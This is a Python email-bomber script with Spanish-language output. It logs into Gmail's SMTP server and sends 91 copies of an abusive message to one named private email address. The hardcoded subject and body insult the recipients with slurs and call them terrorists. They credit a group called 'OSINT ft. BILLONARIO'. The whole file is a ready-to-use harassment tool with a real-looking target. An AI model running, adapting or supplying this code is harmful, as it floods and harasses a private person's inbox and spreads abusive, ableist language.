from colorama import *
import smtplib
import time
import os


def fail():
    print("Parámeto inválidó. Inténtelo de nuevo.")
    emailbomber()


def emailbomber():
    cant = 91
    text = 'NO SE CANSAN DE SER DOMADOS POR BILLONARIO SENDERISTAS TERRUCOS COMICOS DE CUARTA. POBRES INFELICES, Y DE INFELICES ESTUPIDOS HACIENDOSE ILUSIONES CON QUE VAN A BORRAR ESTE CANAL.  POBRES IGNORANTES, ANTES DE TENER ESOS PENSAMIENTOS DE MONGOLITOS MEJOR PONGANSE A TRABAJAR. VERGUENZA NACIONAL. LES MANDA MUCHOS SALUDOS, OSINT FT. BILLONARIO'
    subject = 'DOMADOS BY OSINT ft BILLOGOD - SENDERISTAS CSM'

    msg = 'Subject: {}\n\n{}'.format(subject, text)

    author = "your mail"
    to = "avrilmilagro03@gmail.com"
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.ehlo()
        server.login(author, "your password")
        os.system("@title G-Force - Estableciendo conexión...")
        os.system(f"title G-Force - Conexión establecida en {to}...")
        print(f"{Fore.LIGHTYELLOW_EX}")
        value = 0
        while value < cant:
            value += 1
            server.sendmail(author, to, msg)
            print(f"{Fore.LIGHTYELLOW_EX}[{Fore.RESET}+{Fore.LIGHTYELLOW_EX}]{Fore.RESET} {value} mensajes enviados al receptor {to}")
        print(f"{Fore.RESET}¡Emails enviados con éxito!")
        print(f"Presione 'enter' para regresar{Fore.RESET}")
        input()
    except smtplib.SMTPServerDisconnected:
        print("Inicio de sesión en correo emisor inválido. Inténtelo de nuevo.")
        time.sleep(2.5)
        emailbomber()

    except smtplib.SMTPAuthenticationError:
        print("Inicio de sesión en correo emisor inválido.")
        time.sleep(2.5)
        emailbomber()

emailbomber()